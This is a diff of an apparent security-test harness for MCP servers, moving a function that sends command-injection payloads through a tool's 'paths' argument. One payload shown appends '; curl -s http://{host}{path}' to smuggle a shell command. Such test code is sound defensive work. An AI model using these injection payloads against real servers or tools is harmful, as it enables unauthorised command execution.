@@ -61,6 +61,13 @@ KEPT_PLACES = (
 )
 
 
+def _exploit(place_id: str):
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool(TOOL, {"paths": [_payload_for(places[place_id])]})
+
+    return run
+
+
 def _payload_for(place: Place) -> str:
     kind = place.kind
     if kind is PlaceKind.FILE:
@@ -77,13 +84,6 @@ def _payload_for(place: Place) -> str:
     if kind is PlaceKind.HTTP_ENDPOINT:
         return f"; curl -s http://{place.coordinates.host}{place.coordinates.path}"
     raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")
-
-
-def _exploit(place_id: str):
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool(TOOL, {"paths": [_payload_for(places[place_id])]})
-
-    return run
 
 
 BENIGN_PATH = "/opt/server/biome-mcp-server.ts"  # a real file biome processes, outside the layout
